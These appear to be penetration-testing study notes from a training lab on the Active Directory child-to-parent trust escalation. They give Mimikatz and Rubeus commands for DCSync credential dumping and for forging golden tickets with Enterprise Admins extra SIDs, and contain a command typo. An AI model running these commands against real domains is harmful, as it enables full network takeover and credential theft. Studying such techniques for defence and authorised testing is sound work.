-- -
This is a trust relationship attack that you pull off after you have taken over a child domain. It is used to take over the parent domain by abusing the trust relationship and SIDs. 
#### Requirements
- The `KRBTGT` hash for the child domain
- The `SID` for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The `FQDN` of the child domain.
- The `SID` of the Enterprise Admins group of the root domain
- Mimikatz
## Windows
#### Get KRBTGT via Golden Ticket Attack
We are attempting to get a KRBTGT. KRBTGT Stands for Kerberos Ticket Granting Ticket. It's a ticket for the Service Account used to encrypt and sign all Kerberos tickets granted within the given domain. Can be used to request TGS tickets for any service on any host in the domain. Also known as the #GoldenTicket. This is a well-known #persistence method. 
After you have domain admin (or similar), log into said privileged account on a host (or DC) in the domain. Run DCSync attack to obtain the hash for the KRBTGT account.
```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:<domain>\krbtgt
lsadump::dcsync /user:LOGISTICS\krbtgt
```

The child domain SID should be output by mimikatz if you use the method linked above, but otherwise you can also determine this by running the following on the child domain you have compromised via PowerView:
```powershell
Get-DFomainSID
```
#### Get Enterprise Admins Group's SID
```Powershell
# PowerView
Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

#Powershell
Get-ADGroup -Identity "Enterprise Admins" -Server <domain>
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL".
```
#### Create Golden Ticket
**mimikatz**
```powershell
mimikatz.exe
kerberos::golden /user:<username> /domain:<domain> /sid:<child domain sid> /krbtgt:<krbtgt hash> /sids:<enterprise admin sid> /ptt

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# verify golden ticket was created and resides in memory, run outside mimikatz
klist
```

**Rubeus**
```powershell
.\Rubeus.exe golden /rc4:<krbtgt hash> /domain:<domain> /sid:<child domain sid> /sids:<enterprise admin sid> /user:<username> /ptt

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# verify golden ticket was created and resides in memory
klist
```
#### DCSync attack
```powershell
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

## Linux
#### Get KRBTGT NTLM hash of Child-Domain
Perform a DCSync attack on the child domain to dump the NTLM hash of the KRBTGT of the child-domain.
![[Hacking Scratch/Tools/Active Directory/Impacket/secretsdump#^c004aa]]
